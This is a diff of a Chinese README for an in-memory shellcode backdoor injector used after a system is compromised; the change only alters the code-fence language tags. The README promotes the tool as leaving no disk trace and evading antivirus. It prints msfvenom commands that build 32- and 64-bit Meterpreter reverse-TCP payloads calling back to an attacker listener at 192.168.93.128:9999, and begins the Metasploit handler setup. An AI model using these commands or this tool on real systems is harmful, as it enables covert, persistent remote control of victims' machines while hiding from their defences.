@@ -5,7 +5,7 @@
 一款本地通用ShellCode后门注入器，该工具主要用于在后渗透阶段使用，可将后门直接注入到特定进程内存中而不会在磁盘中留下任何痕迹，注入成功后Metasploit即可获取控制权，只要对端不关机则权限会一直维持，由于内存注入无对应磁盘文件，所以也不会触发杀软报毒。
 
 首先需要通过`Metasploit`工具生成一个有效载荷，如下是32位与64位载荷生成命令。
-```
+```BASH
 32位载荷生成
 [root@lyshark ~]# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.93.128 LPORT=9999 -f c
 
@@ -13,7 +13,7 @@
 [root@lyshark ~]# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.93.128 LPORT=9999 -f c
 ```
 后台侦听器的配置也分为`32`位与`6`4位，使用工具时需要与载荷的位数相对应。
-```
+```BASH
 32位侦听器配置
 msf6 > use exploit/multi/handler
 msf6 > set payload windows/meterpreter/reverse_tcp
